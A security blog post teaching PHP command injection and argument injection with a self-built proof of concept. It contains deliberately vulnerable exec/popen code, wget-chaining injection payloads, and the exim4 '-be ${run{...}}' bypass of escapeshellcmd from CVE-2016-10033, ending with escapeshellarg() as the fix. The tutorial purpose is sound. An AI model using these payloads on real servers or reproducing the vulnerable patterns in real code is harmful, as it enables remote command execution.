---
layout: post
title:  "PHP Command Injection and Argument Injection"
categories: TheoricalPractise 
tags:  CommandI ArgumentI PHP
author: AlvaroFolgado
---

* content
{:toc}


![](/images/phpcommandi.png)

## Introduction

This is the first post inside the category “TheoricalPractise”. In these series I will use information around internet to build a working Proof of Concept and test dangerous functions in different languages with the objective to understand basic Web Exploitation vectors.
In this chapter I have built a Proof of Concept in relation with the exploitation of Command Injection and Argument Injection, using PHP language.
Existent PoC can be acceded [here](http://afolgado.com/poc/)


## Command Injection VS Argument Injection

Since this is the first post where I speak about these two vulnerabilities, let’s explain from a nutshell how they work.
Command Injection is possible when we provide to any kind of command interpreter as sh/bash/cmd a String directly coming from an uncontrolled user Input. Vulnerable code as follows:


```php
popen("/usr/bin/touch ".$userInput,"r");
shell_exec("/usr/bin/touch ".$userInput);
passthru("/usr/bin/touch ".$userInput);
[...]
```

In these functions, if the user has access to $userInput String, we could perform an attack of the style:


```bash
ss@email.com;wget http://127.0.0.1/test
ss@email.com|wget http://127.0.0.1/test
[...]
```


On the other hand, an Argument Injection is different; is triggered when attacker inject arguments/parameters to the executable called by these functions. Strings from an uncontrolled user Input Source let the attacker not to inject shell special characters but spaces. Using spaces the attacker can forge a special string that will add arguments,parameters or new options to the target used executable,changing the behaviour of it.

 
```php
$escapedUserInput = escapeshellcmd($userInput);

popen("/usr/bin/touch ".$userInput,"r");
shell_exec("/usr/bin/touch ".$userInput);
passthru("/usr/bin/touch ".$userInput);
[...]
```

In an argument Injection the ability to exploit the vulnerability depends in the nature of the target executable.
The capability of create a successful attack vector will depend in our knowledge of possible parameters/configurations of it. As a last resource we could always try to perform a low level exploit in case of being a C binary, or concatenate other vulnerabilities in case of scripts. It depends how deep we will go into the rabbit hole to exploit it.

A useful way to depurate Argument Injections when we know which executable is being called is using the following bash script:

```bash
#!/bin/bash
cat > /tmp/outgoing-command

echo Received: $0 >> /tmp/outgoing-command
echo Received: $1 >> /tmp/outgoing-command
echo Received: $2 >> /tmp/outgoing-command
echo Received: $3 >> /tmp/outgoing-command
echo Received: $4 >> /tmp/outgoing-command
echo Received: $5 >> /tmp/outgoing-command
echo Received: $6 >> /tmp/outgoing-command
echo Received: $7 >> /tmp/outgoing-command
echo Received: $8 >> /tmp/outgoing-command
echo Received: $9 >> /tmp/outgoing-command

#... whatever more args we should like to capture
```

This will help us to understand what is being passed from the web app side to the operating system executable.
Later on we will use it to show how this PoC works.

## Proof of concept: Command Injection

This PoC is a simple PHP web application that use dangerous functions to perform a call to an operating system executable (sendmail/exim4). This call is forged using an userInput as the "emailFrom". PHP code as follows:

```php
if (isset($_POST['emailFrom']) and isset($_POST['emailTo']) and isset($_POST['body']) and !strcmp($_POST['submit'],'Command Injection')){

	$emailTo = $_POST['emailTo'];

	$emailFrom = $_POST['emailFrom'];

	$body = $_POST['body'];

//Payload1 used here!

//Popen call pipe to the target process, is totally Command Injectable
//popen("/usr/sbin/sendmail -f".$emailFrom,"r");

//Same as Popen!
//shell_exec("/usr/sbin/sendmail -f".$emailFrom);

//Same as Popen!
//passthru("/usr/sbin/sendmail -f".$emailFrom);

//Same as Popen!
exec("/usr/sbin/sendmail -f".$emailFrom);

[...]
```
The way to test this Command Injection is very simple; we just provide the previous payloads in the "emailFrom" input and click Command Injection. By accessing to /var/log/apache2/access.log in target PoC server we can see that the "wget" command is being performed correctly.

In this example anything was escaped,so the payloads were obvious.But sometimes developers will try to do his own escaping functions, committing errors. So trying different payloads is always recommendable.

Creativity and knowledge of the sh/bash/cmd software and Operating System will let attackers to use complex attack vectors to exploit Command Injections. A good example of this was the famous bug [CVE-2014-6271 ShellShock](https://fedoramagazine.org/shellshock-how-does-it-actually-work/). UserInput were provided as environmental variables, this was suppose to be safe, but this last bug make it critical in some CGI servers.


## Proof of concept: Argument Injection

In the second option of the PoC we use a function accessible by PHP to escape possible dangerous shell characters that could let an attacker to concatenate commands. The used code as follows:

```php
}elseif (isset($_POST['emailFrom']) and isset($_POST['emailTo']) and isset($_POST['body']) and !strcmp($_POST['submit'],'Argument Injection')) {
	
	$emailTo = $_POST['emailTo'];

	$emailFrom = escapeshellcmd($_POST['emailFrom']);

	$body = $_POST['body'];

//Payload2 used here!

popen("/usr/sbin/sendmail -f".$emailFrom,"r");

//We can try using the rest of dangerous functions here!

```

This function will escape symbols as ";|{} ...". 
But this php function will not escape spaces, the injection of them will be the key to exploit the Argument Injection. 
As we mentioned before, by analyzing the used executable we could be able to get an exploitation vector. 
The target executable is "sendmail", that in most of Unix OS is a soft link to the target binary to study: "exim4".
Legalhackers have performed an outstanding study of it with exploitation intentions: [PHPMAILER CVE-2016-10033](https://exploitbox.io/vuln/WordPress-Exploit-4-6-RCE-CODE-EXEC-CVE-2016-10033.html)

Out from details that you can read there, "exim4" have an argument "-be" that let us basically to run shell commands in the operating system. Basically you can test running something like in bash:

```bash
/usr/sbin/exim4 -be '${run{/usr/bin/id}}'
```

So in first instance we will think that a payload like the following will do easily the job:

```bash
ss@email.com -be '${run{/usr/bin/wget http://127.0.0.1/test}}'
```
Unfortunately this is not gonna work. To be able to easily figure out what is going on we can use the little bash script we mention before (commanddebugger inside the PoC), and configure the server where the PoC is running as follows:

```bash
ln -s /home/ubuntu/debugger /usr/sbin/sendmail
chmod +x /usr/sbin/sendmail
```
If we run again the previous payload, we can see at /tmp/outgoing-command the following:

```bash
root@ubuntu:/home/ubuntu# cat /tmp/outgoing-command 
Received: /usr/sbin/sendmail
Received: -fss@email.com
Received: -be
Received: \$\{run\{/usr/bin/wget http://127.0.0.1/test\}\}
Received:
Received:
```

This is thanks to escapeshellcmd() escaping every forbidden character inside closed quotes. If we try to use the same payload without quotes we will have another problem:

```bash
Payload:
ss@email.com -be ${run{/usr/bin/wget http://127.0.0.1/test}}

Debugger output:
root@ubuntu:/home/ubuntu# cat /tmp/outgoing-command 
Received: /usr/sbin/sendmail
Received: -fss@email.com
Received: -be
Received: ${run{/usr/bin/wget
Received: http://127.0.0.1/test}}
Received:
Received:
```
The space that let us performing the Argument Injection now is backfiring our ability to exploit it. Awesome study of the target binary properties by LegalHackers let us know that we can exploit the use of characters inside environmental variables strings of exim4 (more details into the previous link).

```bash
Payload:
ss@email.com -be ${run{/usr/bin/wget${substr{10}{1}{$tod_log}}http://127.0.0.1/test}}

Debugger output:
root@ubuntu:/home/ubuntu# cat /tmp/outgoing-command 
Received: /usr/sbin/sendmail
Received: -fss@email.com
Received: -be
Received: ${run{/usr/bin/wget${substr{10}{1}{$tod_log}}http://127.0.0.1/test}}
Received:
Received:
```

Finally we obtain a successful Argument Injection exploitation.

## Proof of concept: 99% safe?

In the last part of this PoC we use the right escape function to avoid the exploitation of these dangerous functions: escapeshellarg(). This one add single quotes around the string so spaces or any special bash symbols are not interpreted by shell/bash. 

```bash
Payload:
ss@email.com -be ${run{/usr/bin/wget${substr{10}{1}{$tod_log}}http://127.0.0.1/test}}

Debugger output:
root@ubuntu:/home/ubuntu# cat /tmp/outgoing-command 
Received: /usr/sbin/sendmail
Received: -fss@email.com -be ${run{/usr/bin/wget${substr{10}{1}{$tod_log}}http://127.0.0.1/test}}
Received:
```
As we can see spaces are no more effective, and we can trust that our dangerous functions are as secure as possible.


## Conclusions
As an **attacker** perspective, if we see data that could be passed as a string to a dangerous function like the following URL:
```js
http://example.com/action?ping=<IP-STRING>
```
We should try a bunch of command Injection Payloads for linux/windows based operating system and look if our external server has been reached. Argument Injection is much trickier, for that we will need to figure out vulnerable 3PP (third party library software) used by target web application.

As a **defensive** perspective, escaping correctly all inputs that go to dangerous functions is critical. We should avoid the abuse in using these functions to perform the application logic, but if we use it, we should be really careful. The Dangerous Functions that I know so far will be listed [here](http://afolgado.com/researchguide/)

## Documentation

[PHPMAILER CVE-2016-10033](https://exploitbox.io/vuln/WordPress-Exploit-4-6-RCE-CODE-EXEC-CVE-2016-10033.html)

[OWASP](https://www.owasp.org/index.php/Main_Page)

